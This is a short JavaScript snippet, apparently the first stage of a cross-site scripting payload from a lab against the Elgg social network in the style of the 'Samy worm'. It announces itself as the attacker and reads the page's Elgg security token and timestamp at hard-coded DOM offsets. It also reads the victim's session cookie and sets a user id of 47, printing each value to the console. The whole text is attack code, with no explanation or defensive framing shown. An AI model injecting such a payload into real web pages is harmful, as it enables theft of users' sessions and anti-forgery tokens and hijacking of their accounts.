console.log("Hello I am the attacker!");
console.log(document.all[35].attributes[0].nodeValue);

let __elgg_ts = String(document.all[35].attributes[0].nodeValue).substr(49,10);
let __elgg_token = String(document.all[35].attributes[0].nodeValue).substr(74,22);
let samy_id = 47;
let cookie = document.cookie;
console.log("samy_id = " + String(samy_id));
console.log("cookie = " + cookie);
console.log("__elgg_ts = " + __elgg_ts);
console.log("__elgg_token = " + __elgg_token);

